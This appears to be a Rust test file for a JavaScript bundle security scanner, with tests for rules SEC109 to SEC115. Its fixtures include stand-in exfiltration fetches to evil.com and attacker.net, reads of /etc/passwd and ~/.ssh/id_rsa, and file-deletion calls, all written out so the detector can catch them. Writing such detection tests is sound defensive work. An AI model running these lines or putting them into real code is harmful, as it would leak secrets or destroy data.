//! SEC109–SEC115 detection tests. Split from a single combined test module
//! purely to stay under the file-size limit — see docs/code-structure.md.

use super::super::types::Severity;
use super::{is_blocked, scan_bundle};

// -----------------------------------------------------------------------
// SEC109 — large encoded blobs (warn, no signal)
// -----------------------------------------------------------------------

#[test]
fn sec109_large_base64_buffer_from() {
    let b64 = "A".repeat(210);
    let content = format!(r#"const x = Buffer.from("{b64}", "base64");"#);
    let findings = scan_bundle(&content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC109"),
        "findings: {findings:?}"
    );
    // SEC113 (block) also fires on base64 content — just verify SEC109 itself is warn.
    assert!(
        findings
            .iter()
            .filter(|f| f.rule_id == "SEC109")
            .all(|f| f.severity == Severity::Warn),
        "SEC109 findings should have warn severity"
    );
}

#[test]
fn sec109_large_base64_atob() {
    let b64 = "B".repeat(210);
    let content = format!(r#"const x = atob("{b64}");"#);
    let findings = scan_bundle(&content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC109"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec109_large_hex_buffer_from() {
    let hex = "a".repeat(410);
    let content = format!(r#"const x = Buffer.from("{hex}", "hex");"#);
    let findings = scan_bundle(&content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC109"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec109_short_base64_no_match() {
    let b64 = "A".repeat(50);
    let content = format!(r#"const x = Buffer.from("{b64}", "base64");"#);
    let findings = scan_bundle(&content, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC109"),
        "short base64 should not match SEC109: {findings:?}"
    );
}

#[test]
fn sec109_short_hex_no_match() {
    let hex = "a".repeat(100);
    let content = format!(r#"const x = Buffer.from("{hex}", "hex");"#);
    let findings = scan_bundle(&content, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC109"),
        "short hex should not match SEC109: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC110 — sensitive fs/net/env ops (two-pass, warn)
// -----------------------------------------------------------------------

#[test]
fn sec110_require_net_with_connect() {
    let content = r#"var net = require("net"); net.connect(80, "host");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
    assert!(!is_blocked(&findings), "SEC110 should be warn");
}

#[test]
fn sec110_require_node_net_with_create_connection() {
    let content = r#"var net = require("node:net"); net.createConnection(80, "host");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec110_import_fs_with_process_env_bracket() {
    let content = r#"import fs from "fs"; const key = process.env["API_KEY"];"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec110_process_env_dot_notation() {
    let content = r#"var fs = require("fs"); const val = process.env.SECRET;"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec110_etc_passwd() {
    let content = r#"var fs = require("fs"); fs.readFileSync("/etc/passwd");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec110_ssh_path() {
    let content = r#"var fs = require("fs"); fs.readFileSync("~/.ssh/id_rsa");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec110_readfile_env() {
    let content = r#"var fs = require("fs"); fs.readFile("config.env", "utf8", cb);"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec110_readfile_sync_env() {
    let content = r#"var fs = require("node:fs"); fs.readFileSync("app.env");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC110"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec110_no_signal_skips_rule() {
    let findings = scan_bundle(r#"const val = process.env.KEY;"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC110"),
        "SEC110 should not fire without net/fs import: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC111 — destructive fs operations (two-pass, block)
// -----------------------------------------------------------------------

#[test]
fn sec111_require_fs_with_unlink() {
    let content = r#"var fs = require("fs"); fs.unlink("/tmp/file", cb);"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC111"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec111_unlink_sync() {
    let content = r#"var fs = require("node:fs"); fs.unlinkSync("/tmp/file");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC111"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec111_rmdir() {
    let content = r#"var fs = require("fs"); fs.rmdir("/tmp/dir", cb);"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC111"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec111_rm_via_esm_import() {
    let content = r#"import fs from "fs"; fs.rm("/tmp/dir", { recursive: true }, cb);"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC111"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec111_fs_promises_with_unlink() {
    let content = r#"import { unlink } from "fs/promises"; await unlink("/tmp/file");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC111"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec111_no_signal_skips_rule() {
    let findings = scan_bundle(r#"fs.unlink("/tmp/file", cb);"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC111"),
        "SEC111 should not fire without fs import: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC112 — untrusted domain requests (no signal, block)
// -----------------------------------------------------------------------

#[test]
fn sec112_untrusted_domain_blocked() {
    let findings = scan_bundle(r#"fetch("https://evil.com/steal");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC112"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec112_http_untrusted_blocked() {
    let findings = scan_bundle(r#"fetch("http://attacker.net/data");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC112"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec112_trusted_godaddy_subdomain_allowed() {
    let findings = scan_bundle(
        r#"fetch("https://api.godaddy.com/v1/products");"#,
        "test.mjs",
    );
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC112"),
        "godaddy.com subdomain should be trusted: {findings:?}"
    );
}

#[test]
fn sec112_trusted_godaddy_root_allowed() {
    let findings = scan_bundle(r#"fetch("https://godaddy.com/path");"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC112"),
        "godaddy.com root should be trusted: {findings:?}"
    );
}

#[test]
fn sec112_trusted_localhost_with_port_allowed() {
    let findings = scan_bundle(r#"fetch("https://localhost:3000/api");"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC112"),
        "localhost should be trusted: {findings:?}"
    );
}

#[test]
fn sec112_trusted_127_0_0_1_allowed() {
    let findings = scan_bundle(r#"fetch("http://127.0.0.1/api");"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC112"),
        "127.0.0.1 should be trusted: {findings:?}"
    );
}

#[test]
fn sec112_godaddy_lookalike_blocked() {
    let findings = scan_bundle(r#"fetch("https://godaddy.com.evil.net/");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC112"),
        "godaddy.com.evil.net should not be trusted: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC113 — any encoded payload (no signal, block)
// -----------------------------------------------------------------------

#[test]
fn sec113_atob_blocked() {
    let findings = scan_bundle(r#"const x = atob("aGVsbG8=");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC113"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec113_buffer_from_base64_blocked() {
    let findings = scan_bundle(
        r#"const x = Buffer.from("shortval", "base64");"#,
        "test.mjs",
    );
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC113"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec113_buffer_from_hex_blocked() {
    let findings = scan_bundle(r#"const x = Buffer.from("deadbeef", "hex");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC113"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec113_buffer_from_utf8_allowed() {
    let findings = scan_bundle(
        r#"const x = Buffer.from("hello world", "utf8");"#,
        "test.mjs",
    );
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC113"),
        "utf8 encoding should not match SEC113: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC114 — debugger statement (no signal, block)
// -----------------------------------------------------------------------

#[test]
fn sec114_debugger_blocked() {
    let findings = scan_bundle("function x() { debugger; return 1; }", "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC114"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec114_debugger_word_boundary() {
    let findings = scan_bundle(r#"const debuggerMode = true;"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC114"),
        "debuggerMode should not match SEC114: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC115 — dynamic require/import (no signal, block)
// -----------------------------------------------------------------------

#[test]
fn sec115_dynamic_require_blocked() {
    let findings = scan_bundle(r#"const m = require(userInput);"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC115"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec115_dynamic_import_blocked() {
    let findings = scan_bundle(r#"const m = await import(dynamicPath);"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC115"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec115_static_require_allowed() {
    let findings = scan_bundle(r#"const m = require("./module");"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC115"),
        "static string require should not match SEC115: {findings:?}"
    );
}

#[test]
fn sec115_static_import_allowed() {
    let findings = scan_bundle(r#"const m = await import("./module");"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC115"),
        "static string import should not match SEC115: {findings:?}"
    );
}

#[test]
fn sec115_import_meta_not_matched() {
    let findings = scan_bundle(r#"const url = import.meta.url;"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC115"),
        "import.meta.url should not match SEC115: {findings:?}"
    );
}
